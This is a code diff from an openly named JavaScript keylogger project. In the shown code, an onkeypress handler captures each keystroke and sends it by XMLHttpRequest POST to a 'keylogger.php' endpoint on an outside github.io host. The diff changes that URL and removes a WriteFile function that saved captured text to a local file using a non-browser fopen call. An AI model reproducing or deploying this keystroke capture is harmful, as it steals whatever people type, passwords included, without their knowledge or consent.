@@ -24,7 +24,7 @@ onkeypress = function(e) { // calling the function to execute whenever a keystro
  		console.log(allTextSplit);
       var http = new XMLHttpRequest();
       var param = encodeURI(key)
-      http.open("POST","http://jddunn.github.io/keylogger.php",true);
+      http.open("POST","http://jddunn.github.io/web-based-keylogger/keylogger.php",true);
       http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
       http.send("key="+param);
  	}
@@ -55,7 +55,6 @@ function checkSplitText(allTextSplit) {
 	// console.log("New string: " + allTextSplit[i]);
 	}
 	hasDuplicates(allTextSplit);
-	WriteFile(allTextSplit);
 }
 
 
@@ -72,15 +71,4 @@ function hasDuplicates(allTextSplit) {
         valuesSoFar.push(value);
     }
     // return false;
-}
-
-function WriteFile() {
-
-	var fh = fopen("C:\\Users\\JD\\Documents\\GitHub\\web-keylogger-analyzer\\data.txt", 3); // Open the file for writing
-
-	if(fh!=-1) { // If the file has been successfully opened 
-    	var str = allTextSplit;
-    	fwrite(fh, str); // Write the string to a file
-    	fclose(fh); // Close the file 
-    }
 }
